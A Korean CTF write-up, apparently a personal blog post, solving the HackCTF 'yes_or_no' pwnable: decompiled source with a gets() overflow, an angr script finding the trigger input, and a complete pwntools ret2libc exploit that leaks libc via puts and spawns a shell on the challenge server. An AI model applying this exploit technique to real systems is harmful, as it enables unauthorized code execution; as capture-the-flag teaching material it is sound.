---
layout: post
title: "HackCTF x64 yes_or_no"
author: "Ph4nt0m"
categories: [WriteUp, Pwnable]
date: 2021-03-31 17:00
tag: [WriteUp, HackCTF, Pwnable]
---

# yes_or_no

## Source

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  int v3; // eax
  int v4; // eax
  int v5; // ecx
  int v6; // eax
  int v7; // eax
  char s[10]; // [rsp+Eh] [rbp-12h]
  int v10; // [rsp+18h] [rbp-8h]
  int v11; // [rsp+1Ch] [rbp-4h]

  setvbuf(stdout, 0LL, 2, 0LL);
  v11 = 5;
  puts("Show me your number~!");
  fgets(s, 10, stdin);
  v10 = atoi(s);
  if ( (v11 - 10) >> 3 < 0 )
  {
    v4 = 0;
  }
  else
  {
    v3 = v11++;
    v4 = v10 - v3;
  }
  if ( v4 == v10 )
  {
    puts("Sorry. You can't come with us");
  }
  else
  {
    v5 = 1204 / ++v11;
    v6 = v11++;
    if ( v10 == (v6 * v5) << (++v11 % 20 + 5) )
    {
      puts("That's cool. Follow me");
      gets(s);
    }
    else
    {
      v7 = v11--;
      if ( v10 == v7 )
      {
        printf("Why are you here?");
        return 0;
      }
      puts("All I can say to you is \"do_system+1094\".\ngood luck");
    }
  }
  return 0;
}
```

## Solve

이 문제는 Ubuntu 18.04환경에서 제작되었다. 그래서 따로 libc를 제공한다.

LD_LIBRARY_PATH에 해당 Libc를 추가하고 바이너리를 실행시킨다.

```bash
➜  yes_or_no git:(master) ✗ cat LIBPATH.txt
export LD_LIBRARY_PATH=/home/ubuntu/CTF/hackctf/yes_or_no:$LD_LIBRARY_PATH
➜  yes_or_no git:(master) ✗ source ./LIBPATH.txt
```

문제는 입력값으로 취약점 트리거가 어렵다는건데

```c
if ( v10 == (v6 * v5) << (++v11 % 20 + 5) )
{
  puts("That's cool. Follow me");
  gets(&s);
}
```

이 부분에 오기까지 어떤값을 넣어야 할지 몰라서 Angr를 이용해 값을 구했다.

```python
import angr,sys

def main():
    proj = angr.Project('./yes_or_no')
    init_state = proj.factory.entry_state()
    simulation = proj.factory.simgr(init_state)

    simulation.explore(find=is_successful, avoid=should_abort)

    if simulation.found:
        solution = simulation.found[0]
        print('flag: ', solution.posix.dumps(sys.stdin.fileno()))
    else:
        print('no flag')

# set expected function
# note: sys.stdout.fileno() is the stdout file discription number. you can replace it by 1
# note: state.posix is the api for posix, and dumps(file discription number) will get the
# bytes for the pointed file.
def is_successful(state):
    return b"That's cool. Follow me" in state.posix.dumps(sys.stdout.fileno())

# set disexpected function
def should_abort(state):
    return b"Why are you here?" in state.posix.dumps(sys.stdout.fileno())

if __name__ == '__main__':
    main()
```

```bash
➜  yes_or_no git:(master) ✗ python3 angr_yes_or_no.py
flag:  b'+9830400\xe1'
```

조금 특이한 값인 \xe1을 빼도 "+"를 빼도 정상적으로 취약점 부분으로 트리거가 된다.

```bash
gef➤  x/40xg $rsp
0x7fffffffe390:	0x0000000000400820	0x61610000004005e0
0x7fffffffe3a0:	0x6161616161616161	0x0000000800960000
0x7fffffffe3b0:	0x0000000000400820	0x00007ffff7a05b97
0x7fffffffe3c0:	0x0000000000000001	0x00007fffffffe498
```

버퍼를 다채우고 SFP 포함 더미는 16바이트가 필요하다 그리고 RTL을 생각했는데 Libc 베이스를 구해야한다.

사용하는 함수중에 가장 많이 쓰이는 puts를 이용해 leak을 하겠다.

```python
from pwn import *

#context.log_level = 'DEBUG'
context.arch = 'amd64'
e = ELF("./yes_or_no")
l = ELF("./libc-2.27.so")
#p = process("./yes_or_no")
r = remote("ctf.j0n9hyun.xyz", 3009)
pop_rdi = 0x400883
ret = 0x40056e
puts_plt = e.plt['puts']
puts_got = e.got['puts']
puts_offset = l.symbols['puts']
main = e.symbols['main']
system_offset = l.symbols['system']
binsh_offset = 0x1b3e9a

log.info("pop rdi; ret : 0x%x"%(pop_rdi))

print r.recvuntil("Show me your number~!\n")
r.sendline("+9830400")
print r.recvuntil("That's cool. Follow me\n")

payload = ''
payload += "A"*26
payload += p64(pop_rdi)
payload += p64(puts_got)
payload += p64(puts_plt)
payload += p64(main)

r.sendline(payload)
puts_addr = u64(r.recvuntil("\x7f").ljust(8, "\x00"))
log.info("puts_addr : %x"%(puts_addr))
libc_base = puts_addr - puts_offset
log.info("libc_base : %x"%(libc_base))
system_addr = libc_base + system_offset
log.info("system_addr : %x"%(system_addr))
binsh = libc_base + binsh_offset
log.info("/bin/sh addr : %x"%(binsh))

print r.recvuntil("Show me your number~!\n")
r.sendline("+9830400")
print r.recvuntil("That's cool. Follow me\n")
payload = ''
payload += "A"*26
payload += p64(pop_rdi)
payload += p64(binsh)
payload += p64(ret)
payload += p64(system_addr)

r.sendline(payload)
r.interactive()
```

```python
➜  yes_or_no git:(master) ✗ python yes_or_no.py
[*] '/home/ubuntu/CTF/hackctf/yes_or_no/yes_or_no'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[*] '/home/ubuntu/CTF/hackctf/yes_or_no/libc-2.27.so'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[+] Opening connection to ctf.j0n9hyun.xyz on port 3009: Done
[*] pop rdi; ret : 0x400883
Show me your number~!

That's cool. Follow me

[*] puts_addr : 7f5d267ec9c0
[*] libc_base : 7f5d2676c000
[*] system_addr : 7f5d267bb440
[*] /bin/sh addr : 7f5d2691fe9a

Show me your number~!

That's cool. Follow me

[*] Switching to interactive mode
$ id
uid=1000(attack) gid=1000(attack) groups=1000(attack)
```

나머지 설명은 내일달기로~